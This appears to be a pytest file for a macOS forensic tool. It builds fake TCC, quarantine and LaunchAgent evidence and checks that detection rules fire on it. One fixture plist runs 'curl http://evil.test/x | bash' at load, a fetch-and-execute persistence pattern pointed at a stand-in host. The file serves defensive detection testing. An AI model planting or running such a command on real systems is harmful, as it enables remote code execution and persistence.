# SPDX-License-Identifier: GPL-3.0-or-later
"""Raw macOS artifacts (SQLite/plist) off a directory ingest via the existing
normalizers + detections — no Velociraptor. Fixtures are built in a tmp dir so no
host data is committed."""
import plistlib
import sqlite3

from raptorscope.cli import normalize_collection
from raptorscope.detect.evaluate import load_rules, run_rules
from raptorscope.evidence import is_artifact_dir

RULES = load_rules("detections/sigma")


def _build_evidence(root):
    # raw TCC.db: a path-based client granted a sensitive service
    tcc = root / "TCC.db"
    con = sqlite3.connect(tcc)
    con.execute(
        "CREATE TABLE access (service TEXT, client TEXT, client_type INTEGER, "
        "auth_value INTEGER, last_modified INTEGER)"
    )
    con.execute(
        "INSERT INTO access VALUES (?,?,?,?,?)",
        ("kTCCServiceAccessibility", "/Users/Shared/.helper/agent", 1, 2, 1751000000),
    )
    con.commit()
    con.close()

    # raw QuarantineEventsV2: a cleartext-http download
    q = root / "com.apple.LaunchServices.QuarantineEventsV2"
    con = sqlite3.connect(q)
    con.execute(
        "CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT, "
        "LSQuarantineTimeStamp REAL, LSQuarantineAgentName TEXT, "
        "LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, "
        "LSQuarantineOriginURLString TEXT)"
    )
    con.execute(
        "INSERT INTO LSQuarantineEvent VALUES (?,?,?,?,?,?)",
        ("id1", 773000000.0, "Safari", "http://malware.test/x.dmg", "n", "http://malware.test/"),
    )
    con.commit()
    con.close()

    # raw LaunchAgent plist
    la = root / "LaunchAgents"
    la.mkdir()
    with open(la / "com.evil.agent.plist", "wb") as fh:
        plistlib.dump(
            {"Label": "com.evil.agent",
             "ProgramArguments": ["/bin/bash", "-c", "curl http://evil.test/x | bash"],
             "RunAtLoad": True},
            fh,
        )


def test_is_artifact_dir_detects_raw_evidence(tmp_path):
    _build_evidence(tmp_path)
    assert is_artifact_dir(str(tmp_path)) is True


def test_raw_artifacts_ingest_and_detect(tmp_path):
    _build_evidence(tmp_path)
    docs = normalize_collection(str(tmp_path))
    datasets = {d["event"]["dataset"] for d in docs}
    # three raw files -> three existing datasets
    assert {"macos.tcc", "macos.quarantine", "macos.persistence"} <= datasets
    # the TCC row is a real path-client sensitive grant
    tcc = next(d for d in docs if d["event"]["dataset"] == "macos.tcc")
    assert tcc["raptorscope"]["tcc"]["client_type"] == "path"
    assert tcc["raptorscope"]["tcc"]["allowed"] is True
    # timestamps converted from raw epoch forms
    quar = next(d for d in docs if d["event"]["dataset"] == "macos.quarantine")
    assert quar["@timestamp"].startswith("20")  # ISO, not a raw float

    # existing detections fire on raw-file-sourced data
    titles = " ".join(a["title"].lower() for a in run_rules(docs, RULES))
    assert "cleartext" in titles or "http" in titles          # quarantine
    assert "path-based" in titles or "path client" in titles  # tcc
